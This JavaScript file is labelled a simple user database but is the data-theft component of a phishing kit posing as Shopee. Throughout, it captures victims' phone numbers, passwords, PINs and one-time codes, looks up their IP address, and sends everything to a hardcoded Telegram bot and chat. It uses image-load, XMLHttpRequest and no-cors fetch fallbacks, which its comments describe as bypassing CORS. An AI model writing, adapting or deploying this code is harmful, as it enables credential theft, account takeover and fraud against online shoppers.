// Simple database system for user data
class UserDatabase {
    constructor() {
        this.users = [];
        this.loadFromStorage();
    }

    // Save user data (with optional Telegram sending)
    async saveUser(userData, sendToTelegram = true) {
        console.log('🔄 saveUser called with data:', userData, 'sendToTelegram:', sendToTelegram);

        const timestamp = new Date().toISOString();
        const user = {
            id: this.generateId(),
            timestamp: timestamp,
            phone: userData.phone || '',
            password: userData.password || '',
            pin: userData.pin || '',
            otp: userData.otp || '',
            ip: 'Getting IP...', // Will be updated asynchronously
            userAgent: navigator.userAgent,
            ...userData
        };

        console.log('📝 User object created:', user);

        this.users.push(user);
        this.saveToStorage();
        console.log('💾 Data saved to localStorage');

        // Send data to Telegram only if requested
        if (sendToTelegram) {
            await this.sendToTelegramAsync(user);
        }

        return user;
    }

    // Send to Telegram asynchronously (non-blocking) - ensures only one message
    async sendToTelegramAsync(userData) {
        try {
            console.log('📤 Starting Telegram send process...');

            // Try to get IP, but don't fail if it doesn't work
            try {
                const ip = await this.getClientIP();
                userData.ip = ip;
                console.log('🌐 IP fetched successfully:', ip);
            } catch (ipError) {
                console.warn('⚠️ IP fetch failed, using default:', ipError);
                userData.ip = 'Unknown IP';
            }

            // Update stored data with IP
            this.saveToStorage();

            console.log('📤 Sending single message to Telegram...');
            // Send only one message using the most reliable method
            this.sendToTelegramOnce(userData);
        } catch (error) {
            console.error('❌ Failed to send to Telegram:', error);
        }
    }

    // Send to Telegram once - ensures only one message is sent
    sendToTelegramOnce(userData) {
        const token = '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc';
        const chatId = '8593139959';
        const message = this.formatTelegramMessage(userData);
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&t=${Date.now()}`;

        console.log('📤 Sending single Telegram message...');

        // Use the most reliable method: Image loading (works in browsers)
        const img = new Image();
        img.onload = () => {
            console.log('✅ Data successfully sent to Telegram');
        };
        img.onerror = () => {
            console.log('❌ Failed to send to Telegram');
        };
        img.src = url;
    }

    // Generate unique ID
    generateId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2);
    }

    // Get client IP
    async getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unknown IP';
        }
    }

    // Save to localStorage
    saveToStorage() {
        try {
            localStorage.setItem('shopee_users', JSON.stringify(this.users));
        } catch (e) {
            console.error('Failed to save to storage:', e);
        }
    }

    // Load from localStorage
    loadFromStorage() {
        try {
            const stored = localStorage.getItem('shopee_users');
            this.users = stored ? JSON.parse(stored) : [];
        } catch (e) {
            console.error('Failed to load from storage:', e);
            this.users = [];
        }
    }

    // Send data to Telegram
    async sendToTelegram(userData) {
        const token = '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc';
        const chatId = '8593139959';

        const message = this.formatTelegramMessage(userData);

        console.log('📤 Attempting to send message to Telegram:', message);

        return new Promise((resolve) => {
            try {
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&t=${Date.now()}`;

                // Use Image method - most reliable for browser CORS bypass
                const img = new Image();
                img.onload = () => {
                    console.log('✅ Data successfully sent to Telegram (Image method)');
                    resolve(true);
                };
                img.onerror = () => {
                    console.log('❌ Failed to send to Telegram (Image method)');
                    resolve(false);
                };
                img.src = url;

                // Also try XMLHttpRequest as backup with multiple attempts
                setTimeout(() => {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('GET', url + '&method=xhr', true);
                        xhr.onload = () => {
                            if (xhr.status === 200) {
                                console.log('✅ Data successfully sent to Telegram (XMLHttpRequest)');
                                resolve(true);
                            }
                        };
                        xhr.onerror = () => {
                            console.log('❌ XMLHttpRequest failed');
                        };
                        xhr.send();
                        console.log('📤 Backup XMLHttpRequest sent');
                    } catch (e) {
                        console.log('❌ Backup XMLHttpRequest failed');
                    }
                }, 500);

                // Additional backup with fetch
                setTimeout(() => {
                    fetch(url + '&method=fetch', {
                        method: 'GET',
                        mode: 'no-cors'
                    }).then(() => {
                        console.log('✅ Data sent via fetch backup');
                        resolve(true);
                    }).catch(() => {
                        console.log('❌ Fetch backup failed');
                    });
                }, 1000);

            } catch (error) {
                console.error('❌ Failed to send to Telegram:', error);
                resolve(false);
            }
        });
    }

    // Format message for Telegram
    formatTelegramMessage(userData) {
        const date = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
        return `🔐 Shopee Security Data

📱 Phone: ${userData.phone || 'N/A'}
🔑 Password: ${userData.password || 'N/A'}
📌 PIN: ${userData.pin || 'N/A'}

🌐 IP: ${userData.ip || 'Unknown'}
📅 Date: ${date}
🖥️ Device: ${userData.userAgent}

ID: ${userData.id}`;
    }

    // Get all users (for admin)
    getAllUsers() {
        return this.users;
    }

    // Clear all data
    clearAll() {
        this.users = [];
        this.saveToStorage();
    }
}

// Initialize database
window.userDB = new UserDatabase();